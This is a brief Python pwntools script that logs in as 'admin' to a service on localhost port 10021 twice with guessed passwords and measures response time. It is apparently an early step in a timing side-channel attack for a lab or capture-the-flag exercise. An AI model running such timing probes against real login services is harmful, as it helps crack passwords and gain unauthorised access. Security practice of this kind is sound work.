#!/usr/bin/env python3

# type: ignore

import sys
import time

from pwn import *

password = b""
io = remote("localhost", 10021)
io.sendline(b"admin")
s = time.time()
io.send(b"0123456789".ljust(16, b"0"))
print(io.recvline(timeout=1))
e = time.time()
print(e - s)
io.close()

io = remote("localhost", 10021)
io.sendline(b"admin")
s = time.time()
io.send(b"0123456788".ljust(16, b"0"))
print(io.recvline(timeout=1))
e = time.time()
print(e - s)
io.close()
